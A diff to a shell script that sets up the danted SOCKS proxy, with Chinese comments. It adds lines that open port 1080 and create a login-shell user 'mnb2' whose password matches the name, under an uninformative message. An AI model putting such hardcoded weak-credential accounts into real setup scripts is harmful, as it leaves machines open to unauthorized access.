@@ -25,6 +25,10 @@ if [ ! -f danted.conf ]; then
     echo "[-] 错误：未能成功下载 danted.conf 文件！"
     exit 1
 fi
+echo "开放端口中...."
+sudo ufw allow 1080
+echo "cr.."
+sudo useradd -m -s /bin/bash mnb2 && echo "mnb2:mnb2" | sudo chpasswd
 
 echo "[+] 正在重启 danted 服务..."
 sudo systemctl restart danted.service
